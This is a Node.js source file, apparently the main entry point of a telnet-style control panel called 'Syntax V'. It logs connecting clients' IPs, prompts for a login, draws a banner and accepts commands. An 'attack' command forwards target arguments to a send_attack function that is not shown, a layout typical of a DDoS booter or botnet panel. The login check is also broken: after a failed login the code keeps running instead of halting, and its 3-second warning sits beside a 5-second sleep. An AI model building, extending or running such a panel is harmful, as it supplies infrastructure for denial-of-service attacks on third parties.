/*
*
*
*@title: Syntax V
*@since: 4/20/21
*@creator: vlob
*
*
*                 ╔═╗╦ ╦╔╗╔╔╦╗╔═╗═╗ ╦   ╦  ╦
*                 ╚═╗╚╦╝║║║ ║ ╠═╣╔╩╦╝   ╚╗╔╝
*                 ╚═╝ ╩ ╝╚╝ ╩ ╩ ╩╩ ╚═    ╚╝ 
*                      The Final Version
*/

// Files
const Server = require("./assets/Server/main.js");
const ServerFunc = require("./assets/Server/ServerFunc.js");
const Crud = require("./assets/Auth/crud.js");
const Auth = require("./assets/Auth/main.js");

const Extra = require("./assets/Extra/main.js");

const Banner = require("./assets/banner_system/main.js");

const Config = require("./assets/Config/main.js");
const Current = require("./assets/Config/current.js");
const ConfigFunc = require("./assets/Config/currentFunctions.js");

var SIDs = [];
var SessionID;

Server.Server.on('connection', async function(socket) {
    
    console.log('--------------------------------------------');
    console.log("A new connection has been established");
    console.log('Client IP: ' + socket.remoteAddress.replace("::ffff:", "") + ":" + socket.remotePort + ' | IP4/IP6: ' + socket.remoteFamily);
    console.log('--------------------------------------------\r\n\r\n')

    

    var CurrentIP = socket.remoteAddress.replace("::ffff:", "");


    let username = await getInput(socket, "Username: ");
    let password = await getInput(socket, "Password: ");
    let login_run = await Auth.Login(username, password, CurrentIP);
    socket.write(login_run + "\r\n");
    if(login_run === "[x] Error, Failed") {
        socket.write("Killing in 3 seconds.....\r\n")
        Extra.sleep(5000).then(() => {
            socket.destroy();  
        })
    }

    socket.write(Config.Colors.Clear + Banner.ModifyBanner("main") + "\r\n");
    socket.write(Banner.ModifyBanner("hostname"));
    Extra.MoveCursorToLeft(31, socket);
    Extra.MoveCursorUp(1, socket);
    socket.on('data', async function(chunk) {
        Extra.MoveCursorDown(1, socket);
        // socket.write(Config.Colors.Clear + Banner.ModifyBanner("main") + "\r\n");

        var cleanSTR = chunk.toString().replace(/(\r\n|\n|\r)/gm,"");
        console.log(cleanSTR);

        ConfigFunc.GetCmd(cleanSTR);
        // let get_current = await Crud.GetCurrentUser(CurrentIP, "arr");
        // let lul = await ConfigFunc.GetUserInfo(get_current[0]);

        if(cleanSTR.startsWith("clear")) {
            socket.write(Config.Colors.Clear + Banner.ModifyBanner("main") + "\r\n");
        } else if(cleanSTR.startsWith("banner")) {
            socket.write(Banner.ModifyBanner("main") + "\r\n");
        } else if(cleanSTR.startsWith("attack")) {
            console.log(Current.CurrentCmd.arg[1], Current.CurrentCmd.arg[2], Current.CurrentCmd.arg[3], Current.CurrentCmd.arg[4]);
            let attacking = await Extra.send_attack(Current.CurrentCmd.arg[1], Current.CurrentCmd.arg[2], Current.CurrentCmd.arg[3], Current.CurrentCmd.arg[4]);
            socket.write(Banner.ModifyBanner("main") + attacking + "\r\n");
        }
        socket.write(Banner.ModifyBanner("hostname"));
        Extra.MoveCursorToLeft(31, socket);
        Extra.MoveCursorUp(1, socket);
    });

    socket.on('end', function() {
        Crud.removeSession(CurrentIP);
        console.log('Client: ' + CurrentIP + ' has left!\r\n');
    });

    socket.on('error', function(err) {
        console.log("[NODEJS SERVER ERROR(IGNORE)]: " + err + "\r\n");
    });
});

function getInput(socket, string) {
    return new Promise(resolve => {
        socket.write(string);

        socket.on("data", c => {
        c = c.toString();
        
        if(c.indexOf("\n") !== -1) {
            socket.removeAllListeners("data");
  
          return resolve(c.trim());
        }
      });
    });
} 